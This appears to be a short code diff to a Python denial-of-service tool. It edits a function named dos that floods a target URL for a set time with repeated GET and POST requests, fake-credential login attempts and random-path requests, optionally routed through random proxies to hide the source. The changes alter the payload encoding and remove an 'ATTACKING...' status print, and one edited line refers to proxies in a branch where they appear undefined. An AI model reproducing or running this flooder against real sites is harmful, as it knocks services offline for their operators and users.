@@ -86,21 +86,19 @@ def dos(url, tm, prx):
 			try:
 				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
 				requests.get(url, proxies = proxies)
-				requests.post(url, headers = header, data = payload, proxies = proxies)
+				requests.post(url, headers = header, json = payload, proxies = proxies)
 				requests.get(url, auth=('username', 'fakepass'), proxies = proxies)
 				requests.get(url + '/' + random.choice(lib), proxies = proxies)
-				print("\033[32mATTACKING...")
 			
 			except:
 				pass
 	else:
 		while time.monotonic() - t <= tm:
 			try:
-				requests.get(url)
-				requests.post(url, headers = header, data = payload)
+				requests.get(url, proxies = proxies)
+				requests.post(url, headers = header, json = payload)
 				requests.get(url, auth=('username', 'fakepass'))
 				requests.get(url + '/' + random.choice(lib))
-				print("\033[32mATTACKING...")
 			
 			except:
 				pass
